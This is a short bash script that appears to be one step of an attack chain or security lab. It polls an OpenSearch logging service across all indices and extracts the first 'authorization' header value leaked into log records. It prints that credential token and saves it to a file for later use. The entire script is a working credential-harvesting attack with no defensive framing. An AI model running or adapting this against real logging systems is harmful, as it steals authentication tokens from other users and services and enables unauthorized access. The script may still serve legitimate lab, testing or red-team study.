#!/usr/bin/env bash
set -eu

LOG_ENDPOINT="http://opensearch.$LOG_NS:9200"
OUT_FILE="$DATA_PATH/KC1/token"
MAX=100
TOKEN=""

# Installing dependencies and setup
apt-get update >/dev/null 2>&1
apt-get install -y --no-install-recommends curl jq ca-certificates >/dev/null 2>&1
mkdir -p $(dirname $OUT_FILE)

for i in $(seq 1 $MAX); do
  TOKEN="$(curl -s "${LOG_ENDPOINT}/_all/_search" \
    -H 'Content-Type: application/json' \
    -d '{
      "size": 5000,
      "sort": [
        { "@timestamp": { "order": "desc" } }
      ],
      "query": { "match_all": {} }
    }' \
    | jq -r '.hits.hits[]._source.attributes.authorization // empty' \
    | grep -v '^$' \
    | head -n1)"

  if [ -n "$TOKEN" ]; then
    echo "Found in attempt $i:"
    echo "$TOKEN"
    break
  fi

  sleep 5
done

if [ -z "$TOKEN" ]; then
  echo "No values after $MAX retries"
fi

echo "TOKEN=$TOKEN"
echo "$TOKEN" > "$OUT_FILE"
echo "Saved value in: $OUT_FILE"
